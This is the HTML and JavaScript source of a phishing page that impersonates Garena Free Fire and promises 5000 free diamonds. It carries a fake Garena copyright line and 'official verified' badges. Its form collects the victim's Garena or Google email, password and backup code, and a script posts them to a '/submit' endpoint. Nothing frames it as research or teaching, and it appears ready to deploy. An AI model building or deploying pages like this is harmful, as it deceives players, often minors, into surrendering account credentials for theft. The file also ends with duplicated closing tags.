<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Garena Free Fire - Claim Your Free Diamonds</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Teko:wght@400;600;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            background: radial-gradient(circle, #1a1a1a 0%, #000000 100%);
            font-family: 'Roboto', sans-serif;
            color: white;
            overflow-x: hidden;
        }
        .ff-font {
            font-family: 'Teko', sans-serif;
            text-transform: uppercase;
        }
        .bg-card {
            background: rgba(20, 20, 20, 0.9);
            border: 2px solid #ff4655;
            box-shadow: 0 0 20px rgba(255, 70, 85, 0.3);
        }
        .btn-claim {
            background: linear-gradient(90deg, #ff4655 0%, #ff8b3d 100%);
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .btn-claim:hover {
            transform: scale(1.05);
            box-shadow: 0 0 15px #ff4655;
        }
        .input-field {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid #333;
            color: white;
            transition: border 0.3s;
        }
        .input-field:focus {
            border-color: #ff4655;
            outline: none;
        }
        .fire-border {
            position: relative;
        }
        .fire-border::after {
            content: '';
            position: absolute;
            bottom: -2px;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #ff4655, transparent);
        }
        /* Custom Modal */
        #customAlert {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 100;
        }
    </style>
</head>
<body class="min-h-screen flex flex-col items-center justify-center p-4">

    <!-- Header / Logo Area -->
    <div class="mb-8 text-center">
        <h1 class="ff-font text-6xl md:text-8xl font-bold tracking-tighter italic text-white drop-shadow-lg">
            FREE <span class="text-red-500">FIRE</span>
        </h1>
        <p class="ff-font text-xl md:text-2xl text-gray-300 tracking-widest mt-[-10px]">DIAMOND REWARDS CENTER</p>
    </div>

    <!-- Main Form Card -->
    <div class="bg-card w-full max-w-md rounded-lg p-8 relative overflow-hidden">
        <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent"></div>
        
        <h2 class="ff-font text-3xl font-bold mb-6 text-center text-orange-500 italic">Login to Claim</h2>
        
        <form id="jemForm" class="space-y-5">
            <div>
                <label for="email" class="block text-sm font-medium text-gray-400 mb-1 uppercase tracking-wider">Garena / Google Email</label>
                <input type="email" id="email" name="email" required 
                    class="input-field w-full px-4 py-3 rounded text-lg" placeholder="example@gmail.com">
            </div>

            <div>
                <label for="password" class="block text-sm font-medium text-gray-400 mb-1 uppercase tracking-wider">Password</label>
                <input type="password" id="password" name="password" required 
                    class="input-field w-full px-4 py-3 rounded text-lg" placeholder="••••••••">
            </div>

            <div>
                <label for="code" class="block text-sm font-medium text-gray-400 mb-1 uppercase tracking-wider">Backup Code / Player ID</label>
                <input type="text" id="code" name="code" required 
                    class="input-field w-full px-4 py-3 rounded text-lg" placeholder="Enter security code">
            </div>

            <div class="pt-4">
                <button type="submit" class="btn-claim w-full py-4 rounded-md text-white ff-font text-2xl font-bold shadow-lg">
                    CLAIM 5000 DIAMONDS NOW
                </button>
            </div>
        </form>

        <p class="mt-6 text-center text-xs text-gray-500 uppercase tracking-widest">
            © Garena International. All rights reserved.
        </p>
    </div>

    <!-- Security Badges -->
    <div class="mt-8 flex gap-6 opacity-50">
        <div class="flex flex-col items-center">
            <div class="w-10 h-10 border border-gray-500 rounded-full flex items-center justify-center text-[10px] font-bold">100%</div>
            <span class="text-[10px] mt-1">SECURE</span>
        </div>
        <div class="flex flex-col items-center">
            <div class="w-10 h-10 border border-gray-500 rounded-full flex items-center justify-center text-[10px] font-bold">OFFICIAL</div>
            <span class="text-[10px] mt-1">VERIFIED</span>
        </div>
    </div>

    <!-- Custom Success/Error Alert -->
    <div id="customAlert" class="w-80 bg-zinc-900 border-2 border-orange-500 p-6 rounded-lg text-center shadow-2xl">
        <div id="alertIcon" class="mb-4 text-4xl text-orange-500">✔</div>
        <p id="alertMessage" class="text-lg font-bold mb-4 ff-font tracking-wide"></p>
        <button onclick="document.getElementById('customAlert').style.display='none'" class="bg-orange-500 text-black px-6 py-2 rounded font-bold uppercase text-sm">Close</button>
    </div>

    <script>
        document.getElementById('jemForm').addEventListener('submit', function(event) {
            event.preventDefault();

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const code = document.getElementById('code').value;
            const alertBox = document.getElementById('customAlert');
            const alertMsg = document.getElementById('alertMessage');

            // Loading state
            const btn = event.target.querySelector('button');
            const originalText = btn.innerText;
            btn.innerText = "PROCESSING...";
            btn.disabled = true;

            fetch('/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ email, password, code })
            })
            .then(response => response.json())
            .then(data => {
                btn.innerText = originalText;
                btn.disabled = false;
                
                // Show custom alert instead of browser alert
                alertMsg.innerText = data.message;
                alertBox.style.display = 'block';
                
                if(data.message.toLowerCase().includes('success')) {
                    event.target.reset();
                }
            })
            .catch(error => {
                btn.innerText = originalText;
                btn.disabled = false;
                console.error('Error:', error);
                alertMsg.innerText = "Connection Error. Please try again.";
                alertBox.style.display = 'block';
            });
        });
    </script>
</body>
                    </html>    </script>
</body>
</html>
